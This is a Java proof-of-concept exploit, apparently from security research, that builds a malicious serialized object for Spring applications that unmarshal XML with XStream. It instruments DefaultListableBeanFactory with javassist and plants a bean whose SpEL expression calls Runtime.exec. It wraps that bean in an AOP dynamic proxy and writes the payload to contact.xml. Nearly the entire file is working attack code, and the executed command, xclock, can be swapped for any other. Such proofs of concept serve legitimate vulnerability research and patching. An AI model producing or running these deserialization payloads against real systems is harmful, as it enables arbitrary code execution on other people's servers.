package org.pwntester.springbreaker;

import com.company.model.Contact;
import com.company.model.ContactImpl;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAopProxyFactory;
import org.springframework.aop.target.SimpleBeanTargetSource;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.beans.factory.config.BeanDefinition;
import org.springframework.beans.factory.support.AbstractBeanDefinition;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.support.GenericBeanDefinition;
import org.springframework.context.expression.StandardBeanExpressionResolver;
import java.io.IOException;
import javax.xml.transform.stream.StreamResult;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import org.springframework.oxm.xstream.XStreamMarshaller;

public class FactoryProxyXStreamExploit {

	public static void main (String[] arguments) throws IOException {

		// Get a DefaultListableBeanFactory modified so it has no writeReplace() method
		// We cannot load DefaultListableFactory till we are done modyfing it otherwise will get a "attempted duplicate class definition for name" exception
		System.out.println("[+] Getting a DefaultListableBeanFactory modified so it has no writeReplace() method");
		Object instrumentedFactory = null;
		ClassPool pool = ClassPool.getDefault();
		try {
	        pool.appendClassPath(new LoaderClassPath(BeanDefinition.class.getClassLoader()));
	        CtClass instrumentedClass = pool.get("org.springframework.beans.factory.support.DefaultListableBeanFactory");
	        // Call setSerialVersionUID before modifying a class to maintain serialization compatability.
	        SerialVersionUID.setSerialVersionUID(instrumentedClass);
	        CtMethod method = instrumentedClass.getDeclaredMethod("writeReplace");
	        //method.insertBefore("{ System.out.println(\"KKKKKKKKKKK\"); }");
	        method.setName("writeReplaceDisabled");
	        Class instrumentedFactoryClass = instrumentedClass.toClass();
	        instrumentedFactory = instrumentedFactoryClass.newInstance();
    	} catch (Exception e) {
    		e.printStackTrace();
    	}
    	// Modified BeanFactory
    	DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) instrumentedFactory;

        System.out.println("[+] Configuring Malicious BeanFactory");
        beanFactory.setBeanExpressionResolver(new StandardBeanExpressionResolver());

		// Create malicious bean definition programatically
		System.out.println("[+] Creating malicious bean definition programatically");
		GenericBeanDefinition beanDefinition = new GenericBeanDefinition();
		beanDefinition.setBeanClass(ContactImpl.class);
		MutablePropertyValues values = new MutablePropertyValues();
		values.addPropertyValue("name", "#{T(java.lang.Runtime).getRuntime().exec('xclock').toString()}");
		beanDefinition.setPropertyValues(values);
		beanDefinition.setScope("prototype");

		// Preparing BeanFactory to be serialized
		System.out.println("[+] Preparing BeanFactory to be serialized");
		System.out.println("[+] Nullifying non-serializable members");
		try {

			Field constructorArgumentValues = AbstractBeanDefinition.class.getDeclaredField("constructorArgumentValues");
			constructorArgumentValues.setAccessible(true);
			constructorArgumentValues.set(beanDefinition,null);
			System.out.println("[+] BeanDefinition constructorArgumentValues property should be null: " + beanDefinition.getConstructorArgumentValues());
			
			Field methodOverrides = AbstractBeanDefinition.class.getDeclaredField("methodOverrides");
			methodOverrides.setAccessible(true);
			methodOverrides.set(beanDefinition,null);
			System.out.println("[+] BeanDefinition methodOverrides property should be null: " + beanDefinition.getMethodOverrides());
			
			Field autowireCandidateResolver = DefaultListableBeanFactory.class.getDeclaredField("autowireCandidateResolver");
			autowireCandidateResolver.setAccessible(true);
			autowireCandidateResolver.set(beanFactory,null);
			System.out.println("[+] BeanFactory autowireCandidateResolver property should be null: " + beanFactory.getAutowireCandidateResolver());

			// New modified beandefinition cannot be registered with: beanFactory.registerBeanDefinition("exploit", beanDefinition);
			// As it will trigger the validate() method
			// The following code register the bean in the beanFactory
			// This will remove previous beandefinitions
			
			Field beanDefinitionNamesField = DefaultListableBeanFactory.class.getDeclaredField("beanDefinitionNames");
			List<String> beanDefinitionNames = new ArrayList<String>();
			beanDefinitionNames.add("exploit");
			beanDefinitionNamesField.setAccessible(true);
			beanDefinitionNamesField.set(beanFactory,beanDefinitionNames);

			Field beanDefinitionMapField = DefaultListableBeanFactory.class.getDeclaredField("beanDefinitionMap");
			Map<String,BeanDefinition> beanDefinitionMap = new ConcurrentHashMap<String, BeanDefinition>();
			beanDefinitionMap.put("exploit", beanDefinition);
			beanDefinitionMapField.setAccessible(true);
			beanDefinitionMapField.set(beanFactory,beanDefinitionMap);

		
			Field resolvableDependenciesField = DefaultListableBeanFactory.class.getDeclaredField("resolvableDependencies");
			resolvableDependenciesField.setAccessible(true);
			resolvableDependenciesField.set(beanFactory,null);
			System.out.println("[+] BeanFactory resolvableDependencies property should be null");

		} catch(Exception i) {
			i.printStackTrace();
			System.exit(-1);
		}

		// AbstractBeanFactoryBasedTargetSource
		System.out.println("[+] Creating a TargetSource for our handler, all hooked calls will be delivered to our malicious bean provided by our factory");
		SimpleBeanTargetSource targetSource = new SimpleBeanTargetSource();
		//PrototypeTargetSource targetSource = new PrototypeTargetSource();
		//LazyInitTargetSource targetSource = new LazyInitTargetSource();
		targetSource.setTargetBeanName("exploit");
		targetSource.setBeanFactory(beanFactory);

		// JdkDynamicAopProxy (invocationhandler)
		System.out.println("[+] Creating the handler and configuring the target source pointing to our malicious bean factory");
		AdvisedSupport config = new AdvisedSupport();
		config.addInterface(Contact.class); // So that the factory returns a JDK dynamic proxy
		config.setTargetSource(targetSource);
		DefaultAopProxyFactory handlerFactory = new DefaultAopProxyFactory();
		InvocationHandler handler = (InvocationHandler) handlerFactory.createAopProxy(config);

		// Proxy
		System.out.println("[+] Creating a Proxy implementing the server side expected interface (Contact) with our malicious handler");
		Contact proxy = (Contact) Proxy.newProxyInstance(Contact.class.getClassLoader(), new Class<?>[] { Contact.class }, handler);



        FileOutputStream os = null;
        try {
            os = new FileOutputStream("contact.xml");
            XStreamMarshaller marshaller = new XStreamMarshaller();
            marshaller.marshal(proxy, new StreamResult(os));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (os != null) {
                os.close();
            }
        }

        System.out.println("[+] Object marshalled");
	}
}

